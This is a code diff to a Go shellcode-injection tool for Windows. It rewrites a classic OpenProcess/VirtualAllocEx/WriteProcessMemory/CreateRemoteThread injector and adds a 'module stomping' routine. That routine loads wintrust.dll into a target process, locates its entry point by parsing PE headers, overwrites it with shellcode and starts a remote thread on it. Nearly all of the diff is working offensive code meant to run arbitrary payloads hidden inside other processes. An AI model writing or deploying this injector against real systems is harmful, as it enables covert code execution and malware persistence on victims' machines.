@@ -8,6 +8,7 @@ import (
 	//"log"
 	"flag"
 	"unsafe"
+	"strings"
 	"syscall"
 	"encoding/binary"
 	"golang.org/x/sys/windows"
@@ -24,9 +25,127 @@ type RemotePipedShellcodeInjector struct {
 }
 
 const processEntrySize = 568
+var kernel32 = syscall.NewLazyDLL("kernel32.dll")
+var psapi = syscall.NewLazyDLL("Psapi.dll")
+var procVirtualProtect = kernel32.NewProc("VirtualProtect")
+var openProcess = kernel32.NewProc("OpenProcess")
+var virtualAllocEx = kernel32.NewProc("VirtualAllocEx")
+var writeProcMem = kernel32.NewProc("WriteProcessMemory")
+var readProcMemory = kernel32.NewProc("ReadProcessMemory")
+var getModuleHandle = kernel32.NewProc("GetModuleHandleW")
+var getProcAddress = kernel32.NewProc("GetProcAddress")
+var createRemoteThread = kernel32.NewProc("CreateRemoteThread")
+var heapAlloc = kernel32.NewProc("HeapAlloc")
+var getProcessHeap = kernel32.NewProc("GetProcessHeap")
+var waitForSingleObject = kernel32.NewProc("WaitForSingleObject")
+var closeHandle = kernel32.NewProc("CloseHandle")
+var enumProcessModules = psapi.NewProc("EnumProcessModules")
+var getModuleBaseName = psapi.NewProc("GetModuleBaseNameA")
+var MEM_COMMIT = uintptr(0x1000)
+var PAGE_EXECUTE_READWRITE = uintptr(0x40)
+var PAGE_READWRITE = uintptr(0x04)
+var PROCESS_ALL_ACCESS = uintptr(0x1F0FFF)
+var HEAP_ZERO_MEMORY = uintptr(0x00000008)
+var OK = "The operation completed successfully."
 
+type IMAGE_DOS_HEADER struct {
+	Magic    uint16     // USHORT Magic number
+	Cblp     uint16     // USHORT Bytes on last page of file
+	Cp       uint16     // USHORT Pages in file
+	Crlc     uint16     // USHORT Relocations
+	Cparhdr  uint16     // USHORT Size of header in paragraphs
+	MinAlloc uint16     // USHORT Minimum extra paragraphs needed
+	MaxAlloc uint16     // USHORT Maximum extra paragraphs needed
+	SS       uint16     // USHORT Initial (relative) SS value
+	SP       uint16     // USHORT Initial SP value
+	CSum     uint16     // USHORT Checksum
+	IP       uint16     // USHORT Initial IP value
+	CS       uint16     // USHORT Initial (relative) CS value
+	LfaRlc   uint16     // USHORT File address of relocation table
+	Ovno     uint16     // USHORT Overlay number
+	Res      [4]uint16  // USHORT Reserved words
+	OEMID    uint16     // USHORT OEM identifier (for e_oeminfo)
+	OEMInfo  uint16     // USHORT OEM information; e_oemid specific
+	Res2     [10]uint16 // USHORT Reserved words
+	LfaNew   int32      // LONG File address of new exe header
+}
 
-var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
+type IMAGE_OPTIONAL_HEADER32 struct {
+	Magic                       uint16
+	MajorLinkerVersion          byte
+	MinorLinkerVersion          byte
+	SizeOfCode                  uint32
+	SizeOfInitializedData       uint32
+	SizeOfUninitializedData     uint32
+	AddressOfEntryPoint         uint32
+	BaseOfCode                  uint32
+	BaseOfData                  uint32 // Different from 64 bit header
+	ImageBase                   uint64
+	SectionAlignment            uint32
+	FileAlignment               uint32
+	MajorOperatingSystemVersion uint16
+	MinorOperatingSystemVersion uint16
+	MajorImageVersion           uint16
+	MinorImageVersion           uint16
+	MajorSubsystemVersion       uint16
+	MinorSubsystemVersion       uint16
+	Win32VersionValue           uint32
+	SizeOfImage                 uint32
+	SizeOfHeaders               uint32
+	CheckSum                    uint32
+	Subsystem                   uint16
+	DllCharacteristics          uint16
+	SizeOfStackReserve          uint64
+	SizeOfStackCommit           uint64
+	SizeOfHeapReserve           uint64
+	SizeOfHeapCommit            uint64
+	LoaderFlags                 uint32
+	NumberOfRvaAndSizes         uint32
+	DataDirectory               uintptr
+}
+
+type IMAGE_OPTIONAL_HEADER64 struct {
+	Magic                       uint16
+	MajorLinkerVersion          byte
+	MinorLinkerVersion          byte
+	SizeOfCode                  uint32
+	SizeOfInitializedData       uint32
+	SizeOfUninitializedData     uint32
+	AddressOfEntryPoint         uint32
+	BaseOfCode                  uint32
+	ImageBase                   uint64
+	SectionAlignment            uint32
+	FileAlignment               uint32
+	MajorOperatingSystemVersion uint16
+	MinorOperatingSystemVersion uint16
+	MajorImageVersion           uint16
+	MinorImageVersion           uint16
+	MajorSubsystemVersion       uint16
+	MinorSubsystemVersion       uint16
+	Win32VersionValue           uint32
+	SizeOfImage                 uint32
+	SizeOfHeaders               uint32
+	CheckSum                    uint32
+	Subsystem                   uint16
+	DllCharacteristics          uint16
+	SizeOfStackReserve          uint64
+	SizeOfStackCommit           uint64
+	SizeOfHeapReserve           uint64
+	SizeOfHeapCommit            uint64
+	LoaderFlags                 uint32
+	NumberOfRvaAndSizes         uint32
+	DataDirectory               uintptr
+}
+
+type IMAGE_FILE_HEADER struct {
+	Machine              uint16
+	NumberOfSections     uint16
+	TimeDateStamp        uint32
+	PointerToSymbolTable uint32
+	NumberOfSymbols      uint32
+	SizeOfOptionalHeader uint16
+	Characteristics      uint16
+}
 
 func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
 	ret, _, _ := procVirtualProtect.Call(
@@ -52,30 +171,106 @@ func (si RemotePipedShellcodeInjector) injectAAA() string {
 	return ""
 }
 
-func (si RemoteShellcodeInjector) inject() error {
-    MEM_COMMIT := uintptr(0x1000)
-    PAGE_EXECUTE_READWRITE := uintptr(0x40)
-    PROCESS_ALL_ACCESS := uintptr(0x1F0FFF)
-
-    // obtain necessary winapi functions from kernel32 for process injection
-    kernel32 := syscall.MustLoadDLL("kernel32.dll")
-    openproc := kernel32.MustFindProc("OpenProcess")
-    vallocex := kernel32.MustFindProc("VirtualAllocEx")
-    writeprocmem := kernel32.MustFindProc("WriteProcessMemory")
-    createremthread := kernel32.MustFindProc("CreateRemoteThread")
-    closehandle := kernel32.MustFindProc("CloseHandle")
-    
-    // inject & execute shellcode in target process' space
-    processHandle, _, msg := openproc.Call(PROCESS_ALL_ACCESS, 0, uintptr(si.pid))
-    remote_buf, _, _ := vallocex.Call(processHandle, 0, uintptr(len(si.shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-    writeprocmem.Call(processHandle, remote_buf, uintptr(unsafe.Pointer(&si.shellcode[0])), uintptr(len(si.shellcode)), 0)
-    createremthread.Call(processHandle, 0, 0, remote_buf, 0, 0, 0)
-    closehandle.Call(processHandle)
-
-    return msg
+func (si RemoteShellcodeInjector) inject() error { // injects into a currently running process with basic WriteProcessMemory/CreateRemoteThread
+	procHandle, _, err := openProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(si.pid))
+	if err != nil && err.Error() != OK {
+		fmt.Println("OpenProcess fail")
+		return err
+	}
+    remoteBuffer, _, err := virtualAllocEx.Call(procHandle, 0, uintptr(len(si.shellcode)), windows.MEM_COMMIT | windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
+	if err != nil && err.Error() != OK {
+		fmt.Println("VirtualAlloc fail")
+		return err
+	}
+	writeProcMem.Call(procHandle, remoteBuffer, uintptr(unsafe.Pointer(&si.shellcode[0])), uintptr(len(si.shellcode)), 0)
+	_, _, err = createRemoteThread.Call(procHandle, 0, 0, remoteBuffer, 0, 0, 0)
+	if err != nil && err.Error() != OK {
+		fmt.Println("CreateRemoteThread fail")
+		return err
+	}
+	closeHandle.Call(procHandle)
+	return nil
 }
 
-func (si RemotePipedShellcodeInjector) inject() string {
+func (si RemoteShellcodeInjector) injectModuleStomp() error { // injects into a currently running process with the module stomping/dll hollowing method
+	var modulesSizeNeeded uint32
+	var remoteModule windows.Handle
+	modules := make([]windows.Handle, 256) 
+	remoteModuleName := make([]byte, 128) 
+	moduleDll := "wintrust.dll"
+	moduleToInjectString := "C:\\windows\\system32\\" + moduleDll
+	moduleToInject, _ := syscall.UTF16PtrFromString(moduleToInjectString)
+	kernel32String, _ := syscall.UTF16PtrFromString("kernel32")
+	loadlibString := []byte("LoadLibraryW")
+
+	procHandle, _, err := openProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(si.pid))
+	if err != nil && err.Error() != OK {
+		fmt.Println("OpenProcess fail")
+		return err
+	}
+    remoteBuffer, _, err := virtualAllocEx.Call(uintptr(procHandle), 0, uintptr(len(si.shellcode)), windows.MEM_COMMIT, windows.PAGE_READWRITE)
+	if err != nil && err.Error() != OK {
+		fmt.Println("VirtualAlloc fail")
+		return err
+	}
+	writeProcMem.Call(procHandle, remoteBuffer, uintptr(unsafe.Pointer(moduleToInject)), uintptr(128), 0)
+	moduleHandle, _, err := getModuleHandle.Call(uintptr(unsafe.Pointer(kernel32String)))
+	if err != nil && err.Error() != OK {
+		fmt.Println("GetModuleHandle fail")
+		return err
+	}	
+	threadRoutine, _, err := getProcAddress.Call(moduleHandle, uintptr(unsafe.Pointer(&loadlibString[0])))
+	if err != nil && err.Error() != OK {
+		fmt.Println("GetProcAddress fail")
+		return err
+	}
+	dllThead, _, err := createRemoteThread.Call(procHandle, 0, 0, threadRoutine, remoteBuffer, 0, 0)
+	if err != nil && err.Error() != OK {
+		fmt.Println("CreateRemoteThread fail")
+		return err
+	}
+
+	waitForSingleObject.Call(dllThead, uintptr(1000))
+	enumProcessModules.Call(procHandle, uintptr(unsafe.Pointer(&modules[0])), uintptr(int(unsafe.Sizeof(modules[0])) * len(modules)), uintptr(unsafe.Pointer(&modulesSizeNeeded)))
+	numModules := modulesSizeNeeded / 4
+
+	for i := 0; i < int(numModules); i++ {
+		if modules[i] == 0 {
+			continue
+		}
+
+		remoteModule = modules[i]
+		getModuleBaseName.Call(procHandle, uintptr(unsafe.Pointer(remoteModule)), uintptr(unsafe.Pointer(&remoteModuleName[0])), uintptr(len(remoteModuleName)))
+		name := strings.ToLower(string(remoteModuleName[:strings.Index(string(remoteModuleName), "\x00")]))
+		
+		if name == moduleDll { // found address of loaded dll, stop search
+			break 
+		}
+	}
+
+	var targetProcHeader IMAGE_DOS_HEADER
+	var peHeader IMAGE_FILE_HEADER
+	var optHeader64 IMAGE_OPTIONAL_HEADER64
+	var ntHeaderPtr windows.Handle
+	headerData := make([]byte, 0x1000)
+
+	readProcMemory.Call(procHandle, uintptr(remoteModule), uintptr(unsafe.Pointer(&headerData[0])), uintptr(len(headerData)), 0)
+	readProcMemory.Call(procHandle, uintptr(remoteModule), uintptr(unsafe.Pointer(&targetProcHeader)), unsafe.Sizeof(targetProcHeader), 0)
+	readProcMemory.Call(procHandle, uintptr(remoteModule)+uintptr(targetProcHeader.LfaNew), uintptr(unsafe.Pointer(&ntHeaderPtr)), 8, 0)
+	readProcMemory.Call(procHandle, uintptr(remoteModule)+uintptr(targetProcHeader.LfaNew)+4+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader64)), unsafe.Sizeof(optHeader64), 0)
+	
+	dllEntryPoint := uintptr(optHeader64.AddressOfEntryPoint) + uintptr(remoteModule)
+	writeProcMem.Call(procHandle, dllEntryPoint, uintptr(unsafe.Pointer(&si.shellcode[0])), uintptr(len(si.shellcode)), 0)
+	_, _, err = createRemoteThread.Call(procHandle, 0, 0, dllEntryPoint, 0, 0, 0)
+	if err != nil && err.Error() != OK {
+		fmt.Println("CreateRemoteThread fail")
+		return err
+	}
+
+	return nil
+}
+
+func (si RemotePipedShellcodeInjector) inject() string { // injects by creating a new process <-------- should change
 	var globalError string
 	
 	defer func() { //catch or finally
@@ -271,29 +466,6 @@ func (si RemotePipedShellcodeInjector) inject() string {
 		globalError = fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory.Error())
 	}
 
-	// Read the child program's DOS header and validate it is a MZ executable
-	type IMAGE_DOS_HEADER struct {
-		Magic    uint16     // USHORT Magic number
-		Cblp     uint16     // USHORT Bytes on last page of file
-		Cp       uint16     // USHORT Pages in file
-		Crlc     uint16     // USHORT Relocations
-		Cparhdr  uint16     // USHORT Size of header in paragraphs
-		MinAlloc uint16     // USHORT Minimum extra paragraphs needed
-		MaxAlloc uint16     // USHORT Maximum extra paragraphs needed
-		SS       uint16     // USHORT Initial (relative) SS value
-		SP       uint16     // USHORT Initial SP value
-		CSum     uint16     // USHORT Checksum
-		IP       uint16     // USHORT Initial IP value
-		CS       uint16     // USHORT Initial (relative) CS value
-		LfaRlc   uint16     // USHORT File address of relocation table
-		Ovno     uint16     // USHORT Overlay number
-		Res      [4]uint16  // USHORT Reserved words
-		OEMID    uint16     // USHORT OEM identifier (for e_oeminfo)
-		OEMInfo  uint16     // USHORT OEM information; e_oemid specific
-		Res2     [10]uint16 // USHORT Reserved words
-		LfaNew   int32      // LONG File address of new exe header
-	}
-
 	var dosHeader IMAGE_DOS_HEADER
 	var readBytes2 int32
 
@@ -321,30 +493,6 @@ func (si RemotePipedShellcodeInjector) inject() string {
 	if Signature != 17744 {
 		globalError = "[!]PE Signature string was not PE"
 	}
-
-	// Read the child process's PE file header
-	/*
-		typedef struct _IMAGE_FILE_HEADER {
-			USHORT  Machine;
-			USHORT  NumberOfSections;
-			ULONG   TimeDateStamp;
-			ULONG   PointerToSymbolTable;
-			ULONG   NumberOfSymbols;
-			USHORT  SizeOfOptionalHeader;
-			USHORT  Characteristics;
-		} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
-	*/
-
-	type IMAGE_FILE_HEADER struct {
-		Machine              uint16
-		NumberOfSections     uint16
-		TimeDateStamp        uint32
-		PointerToSymbolTable uint32
-		NumberOfSymbols      uint32
-		SizeOfOptionalHeader uint16
-		Characteristics      uint16
-	}
-
 
 	var peHeader IMAGE_FILE_HEADER
 	var readBytes4 int32
@@ -391,39 +539,6 @@ func (si RemotePipedShellcodeInjector) inject() string {
 		} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;
 	*/
 
-	type IMAGE_OPTIONAL_HEADER64 struct {
-		Magic                       uint16
-		MajorLinkerVersion          byte
-		MinorLinkerVersion          byte
-		SizeOfCode                  uint32
-		SizeOfInitializedData       uint32
-		SizeOfUninitializedData     uint32
-		AddressOfEntryPoint         uint32
-		BaseOfCode                  uint32
-		ImageBase                   uint64
-		SectionAlignment            uint32
-		FileAlignment               uint32
-		MajorOperatingSystemVersion uint16
-		MinorOperatingSystemVersion uint16
-		MajorImageVersion           uint16
-		MinorImageVersion           uint16
-		MajorSubsystemVersion       uint16
-		MinorSubsystemVersion       uint16
-		Win32VersionValue           uint32
-		SizeOfImage                 uint32
-		SizeOfHeaders               uint32
-		CheckSum                    uint32
-		Subsystem                   uint16
-		DllCharacteristics          uint16
-		SizeOfStackReserve          uint64
-		SizeOfStackCommit           uint64
-		SizeOfHeapReserve           uint64
-		SizeOfHeapCommit            uint64
-		LoaderFlags                 uint32
-		NumberOfRvaAndSizes         uint32
-		DataDirectory               uintptr
-	}
-
 	/*
 		https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32
 		typedef struct _IMAGE_OPTIONAL_HEADER {
@@ -461,39 +576,6 @@ func (si RemotePipedShellcodeInjector) inject() string {
 		} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
 	*/
 
-	type IMAGE_OPTIONAL_HEADER32 struct {
-		Magic                       uint16
-		MajorLinkerVersion          byte
-		MinorLinkerVersion          byte
-		SizeOfCode                  uint32
-		SizeOfInitializedData       uint32
-		SizeOfUninitializedData     uint32
-		AddressOfEntryPoint         uint32
-		BaseOfCode                  uint32
-		BaseOfData                  uint32 // Different from 64 bit header
-		ImageBase                   uint64
-		SectionAlignment            uint32
-		FileAlignment               uint32
-		MajorOperatingSystemVersion uint16
-		MinorOperatingSystemVersion uint16
-		MajorImageVersion           uint16
-		MinorImageVersion           uint16
-		MajorSubsystemVersion       uint16
-		MinorSubsystemVersion       uint16
-		Win32VersionValue           uint32
-		SizeOfImage                 uint32
-		SizeOfHeaders               uint32
-		CheckSum                    uint32
-		Subsystem                   uint16
-		DllCharacteristics          uint16
-		SizeOfStackReserve          uint64
-		SizeOfStackCommit           uint64
-		SizeOfHeapReserve           uint64
-		SizeOfHeapCommit            uint64
-		LoaderFlags                 uint32
-		NumberOfRvaAndSizes         uint32
-		DataDirectory               uintptr
-	}
 
 	var optHeader64 IMAGE_OPTIONAL_HEADER64
 	var optHeader32 IMAGE_OPTIONAL_HEADER32
